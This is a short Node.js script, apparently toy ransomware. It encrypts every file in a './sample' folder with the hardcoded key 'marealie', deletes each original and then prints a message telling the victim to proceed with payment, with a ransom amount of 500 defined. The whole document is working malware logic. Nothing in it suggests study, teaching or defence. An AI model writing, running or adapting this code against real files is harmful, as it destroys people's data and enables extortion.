const encryptor = require('file-encryptor');
const fs = require('fs');
const readline = require('readline');

const testFolder = './sample';
const ransomAmount = 500;
const key = 'marealie';

encryptFiles();

function encryptFiles() {
  let files = fs.readdirSync(testFolder);
  let encryptedCount = 0;

  files.forEach((file, index) => {
    encryptor.encryptFile(`${testFolder}/${file}`, `${testFolder}/${file}.encrypted`, key, function(err) {
      if (err) {
        console.error(err);
        return;
      }
      console.log(`File ${file} is now encrypted!`);
      
      // Delete the original file
      fs.unlinkSync(`${testFolder}/${file}`);
      console.log(`Original file ${file} deleted!`);
      
      encryptedCount++;

      if (encryptedCount === files.length) {
        console.log('Encryption completed. Please proceed with payment.');
        process.exit(); // End the script after encryption
      }
    });
  });
}
